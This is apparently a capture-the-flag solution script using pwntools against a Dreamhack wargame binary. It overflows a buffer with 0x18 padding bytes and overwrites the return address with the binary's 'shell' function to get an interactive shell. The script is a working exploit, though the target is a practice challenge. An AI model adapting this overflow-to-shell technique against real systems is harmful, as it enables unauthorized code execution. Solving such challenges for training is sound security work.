from pwn import *

p = remote("host8.dreamhack.games", 8872)
e = ELF('./arm_training-v1')

shell = e.sym['shell']

# 0x18 > 16 + 8 = 24
# 진짜 정적으로만 봐도 풀림..
pay = b'A'*0x18 + p32(shell)
p.sendline(pay)

p.interactive()